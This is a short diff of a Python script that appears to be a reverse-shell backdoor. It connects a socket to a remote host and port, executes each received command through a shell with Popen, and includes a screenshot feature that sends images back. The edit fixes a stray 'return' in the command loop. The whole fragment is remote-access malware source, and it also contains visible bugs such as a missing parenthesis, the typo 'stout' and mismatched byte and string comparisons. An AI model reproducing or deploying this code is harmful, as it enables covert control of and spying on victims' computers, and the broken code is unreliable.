@@ -32,6 +32,7 @@ def secreen():
         img_size = os.path.getsize(img)
         s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8")
 
+
 try:
     s.connect((host, port))
 except:
@@ -42,7 +43,7 @@ while True:
     if data[0:].encode("utf-8") == "cd":
         os.chdir(data[3:].encode("utf-8"))
     if data[0:].encode("utf-8") == "screenshot":
-        return secreen()
+        secreen()
     if len(data) > 0:
         terminal = Popen(data[:].encode("utf-8"), shell=True , stout=PIPE , stderr=PIPE , stdin=PIPE)
         outputs_bites = terminal.stdout.read() + terminal.stderr.read() 
